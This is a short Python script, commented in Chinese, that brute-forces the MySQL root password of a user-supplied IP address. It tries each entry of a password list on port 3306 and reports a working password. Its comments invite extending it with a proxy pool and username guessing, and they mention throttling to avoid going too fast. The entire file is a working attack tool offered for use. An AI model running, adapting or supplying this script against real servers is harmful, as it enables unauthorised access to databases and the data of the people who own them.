import time

import pymysql,os

# 可自定义密码文档
# 可在此基础上进行二次开发，列如引入代理池，增加用户名爆破等。

def mysql_check(ip,password):
    try:
        print('check->' + ip + '|' + 'root' + '|' + password)
        ct=pymysql.connect(
            host=ip, # mysql服务端IP
            port=3306, # 默认端口
            user='root', # 默认用户名
            password=password, # 密码字典值
            database='mysql', # 默认数据库名
            charset='utf8' # 字符编码
        )
        print("ip: %s mysql爆破成功 账号: root  密码: %s" %(ip,password))
        exit()
    except Exception as e:
        pass

if __name__ == '__main__':
    path=os.getcwd()
    ip=input('请输入需要爆破mysql的ip: ')
    for password in open(path+'/mysql_pass.txt'):
        password=password.replace('\n','')
        mysql_check(ip,password)
        # # 为了防止速度过快可自定义休眠时间
        # time.sleep(13)